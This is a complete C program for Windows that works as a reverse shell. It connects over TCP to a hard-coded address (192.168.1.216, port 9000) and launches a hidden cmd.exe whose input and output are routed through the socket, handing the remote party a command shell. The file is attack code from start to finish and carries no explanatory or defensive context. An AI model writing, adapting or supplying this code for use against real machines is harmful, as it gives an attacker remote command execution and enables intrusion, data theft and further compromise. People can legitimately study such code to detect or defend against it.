#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main()
{

    char* rem_host = "192.168.1.216";
    int rem_port = 9000;

    WSADATA wsaData;

    // Call WSAStartup()
    int WSAStartup_Result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (WSAStartup_Result != 0) {
        printf("[-] WSAStartup failed.");
        return 1;
    }

    // Call WSASocket()
    SOCKET mysocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);

    // Create sockaddr_in struct
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(rem_host);
    sa.sin_port = htons(rem_port);

    // Call connect()
    int connect_Result = connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
    if (connect_Result != 0)
    {
        printf("[-] connect failed.");
        return 1;
    }

    // Call CreateProcessA()
    STARTUPINFO si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES);
    si.hStdInput = (HANDLE)mysocket;
    si.hStdOutput = (HANDLE)mysocket;
    si.hStdError = (HANDLE)mysocket;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}